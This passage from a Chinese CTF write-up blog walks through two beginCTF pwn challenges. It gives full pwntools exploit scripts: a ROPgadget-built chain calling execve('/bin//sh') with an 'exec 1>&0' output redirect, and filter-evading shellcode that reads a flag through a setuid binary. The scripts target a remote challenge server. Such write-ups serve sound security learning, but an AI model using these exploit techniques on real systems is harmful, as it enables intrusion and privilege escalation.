ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000401ce4</span><span class="token punctuation">)</span> <span class="token comment"># syscall</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这段<code>ropchain</code>是控制返回地址之后执行的内容，由于<code>python</code>语法格式，要把<code>p +=</code>前面的多余空格去掉，这段代码发过去会报错，因为最后一段重复执行<code>add rax，1</code>，长度太长了，所以就需要从返回的<code>gadget</code>中找到可替代的<code>gadget</code>，格式就是将<code>gadget</code>地址放在<code>Q</code>后面。<code>execve</code>的系统调用号在64位中是59，所以最后一段的目的就是把<code>rax</code>加到59，但是返回的<code>gadget</code>太多，可以用<code>grep</code>筛选一下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ROPgadget <span class="token parameter variable">--binary</span>  ./pwn <span class="token parameter variable">--ropchain</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'rax'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>找到以下两条<code>gadget</code>，用这两条代替<code>add rax， 1</code>凑到<code>59</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0x0000000000471267 <span class="token builtin class-name">:</span> <span class="token function">add</span> rax, <span class="token number">2</span> <span class="token punctuation">;</span> ret0x0000000000471280 <span class="token builtin class-name">:</span> <span class="token function">add</span> rax, <span class="token number">3</span> <span class="token punctuation">;</span> ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.32.220.189'</span><span class="token punctuation">,</span> <span class="token number">32151</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''bin_sh = 0x4C50F0pop_rdi_ret = 0x0000000000401f2fp = p64(pop_rdi_ret) + p64(bin_sh) + p64(system)'''</span><span class="token keyword">from</span> struct <span class="token keyword">import</span> pack<span class="token comment"># Padding goes here</span>p <span class="token operator">=</span> <span class="token string">b''</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000409f9e</span><span class="token punctuation">)</span> <span class="token comment"># pop rsi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004c50e0</span><span class="token punctuation">)</span> <span class="token comment"># @ .data</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000448077</span><span class="token punctuation">)</span> <span class="token comment"># pop rax ; ret</span>p <span class="token operator">+=</span> <span class="token string">b'/bin//sh'</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000044a4f5</span><span class="token punctuation">)</span> <span class="token comment"># mov qword ptr [rsi], rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000409f9e</span><span class="token punctuation">)</span> <span class="token comment"># pop rsi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004c50e8</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000043d1d0</span><span class="token punctuation">)</span> <span class="token comment"># xor rax, rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000044a4f5</span><span class="token punctuation">)</span> <span class="token comment"># mov qword ptr [rsi], rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000401f2f</span><span class="token punctuation">)</span> <span class="token comment"># pop rdi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004c50e0</span><span class="token punctuation">)</span> <span class="token comment"># @ .data</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000409f9e</span><span class="token punctuation">)</span> <span class="token comment"># pop rsi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004c50e8</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000047f20b</span><span class="token punctuation">)</span> <span class="token comment"># pop rdx ; pop rbx ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004c50e8</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x4141414141414141</span><span class="token punctuation">)</span> <span class="token comment"># padding</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000043d1d0</span><span class="token punctuation">)</span> <span class="token comment"># xor rax, rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471267</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000401ce4</span><span class="token punctuation">)</span> <span class="token comment"># syscall</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'This is a fake(real) checkin problem.'</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x28</span> <span class="token operator">+</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于程序中有<code>close</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> v4<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-20h] BYREF</span>  <span class="token function">init</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"Welcome to beginCTF!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"This is a fake(real) checkin problem."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> v4<span class="token punctuation">,</span> <span class="token number">512LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">close</span><span class="token punctuation">(</span><span class="token number">1LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">close</span><span class="token punctuation">(</span><span class="token number">2LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以getshell以后还需要重定向标准输出，输入<code>exec 1&gt;&amp;0</code>即可</p><blockquote><p><strong>exec</strong></p><ol><li>代替<code>shell</code>执行命令，区别是<code>shell</code>执行完之后会回到<code>shell</code>，而<code>exec</code>会直接退出。</li><li>文件重定向，也就是<code>exec 1&gt;&amp;0</code>这样将文件描述符为<code>1</code>的文件重定向到<code>0</code>上</li></ol><p>标准输出<code>(close(1))</code>和标准错误<code>(close(2))</code>，有<code>shell</code>但获得不了输出,可以通过<code>exec 1&gt;&amp;0</code>重定向</p></blockquote><h2 id="unhappy"><a href="#unhappy" class="headerlink" title="unhappy"></a>unhappy</h2><p>这题就是写shellcode，但是shellcode里不能含有HAPYhapy</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>addr<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-10h]</span>  addr <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0xFFF00000LL</span><span class="token punctuation">,</span> <span class="token number">0x1000uLL</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> addr <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1LL</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"mmap failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> addr<span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">check</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span>addr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">munmap</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span> <span class="token number">0x1000uLL</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"munmap failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>__int64 __fastcall <span class="token function">check</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">char</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Bh] [rbp-5h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-4h]</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">255</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    result <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>    v2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">==</span> <span class="token char">'h'</span> <span class="token operator">||</span> v2 <span class="token operator">==</span> <span class="token char">'a'</span> <span class="token operator">||</span> v2 <span class="token operator">==</span> <span class="token char">'p'</span> <span class="token operator">||</span> v2 <span class="token operator">==</span> <span class="token char">'y'</span> <span class="token operator">||</span> v2 <span class="token operator">==</span> <span class="token char">'H'</span> <span class="token operator">||</span> v2 <span class="token operator">==</span> <span class="token char">'A'</span> <span class="token operator">||</span> v2 <span class="token operator">==</span> <span class="token char">'P'</span> <span class="token operator">||</span> v2 <span class="token operator">==</span> <span class="token char">'Y'</span> <span class="token punctuation">)</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>推荐一个网站<a href="https://shell-storm.org/online/Online-Assembler-and-Disassembler/">https://shell-storm.org/online/Online-Assembler-and-Disassembler/</a></p><p>要在限制下写的话可以利用<code>sub</code>和<code>add</code>去凑出要实现的代码，比如<code>add rdi,0x61</code>，可以写成<code>add rdi， 0x60</code> <code>add rdi，0x1</code>，但是这题有一个简便的方法就是输入<code>shellcode</code>来执行<code>read</code>，通过<code>syscall</code>调用的<code>read</code>就没有了<code>check</code>的限制，但是第二次输入需要先<code>sleep</code>停顿一下</p><p>先试着用<code>execve(’/bin/sh’, 0,0)</code>来<code>getshell</code></p><pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm">add <span class="token register variable">edi</span>, <span class="token number">0x30</span>mov dword ptr <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">]</span>, <span class="token number">0x6e69622f</span>add <span class="token register variable">edi</span>, <span class="token number">0x4</span>mov dword ptr <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">]</span>, <span class="token number">0x58732f2f</span>add dword ptr <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">]</span>, <span class="token number">0x10000000</span>sub <span class="token register variable">edi</span>,<span class="token number">0x4</span>mov <span class="token register variable">esi</span>, <span class="token number">0</span>mov <span class="token register variable">edx</span>, <span class="token number">0</span>mov <span class="token register variable">eax</span>,<span class="token number">59</span>syscall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打到远程会发现没有<code>cat flag</code>的权限，但是<code>unhappy</code>有<code>rws</code>权限，也就是执行<code>unhappy</code>有<code>root</code>权限，所以把<code>shellcode</code>改成<code>orw</code>即可，直接<code>write</code>会报错，这里也学习到了一个知识点：</p><blockquote><p><code>ssize_t sendfile(int out_fd,int in_fd,off_t* offset,size_t count);</code> <code>sendfile</code>函数在两个文件描述符之间直接传递数据（完全在内核中操作），从而避免了内核缓冲区和用户缓冲区之间的数据拷贝，效率很高，这被称为零拷贝</p></blockquote><p>最终exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.32.220.189'</span><span class="token punctuation">,</span><span class="token number">31276</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'rsi'</span><span class="token punctuation">,</span> <span class="token number">0x300</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>shellcode <span class="token operator">=</span> <span class="token string">b'\x90'</span> <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span> <span class="token operator">+</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./flag'</span><span class="token punctuation">,</span> <span class="token string">'O_RDWR'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token 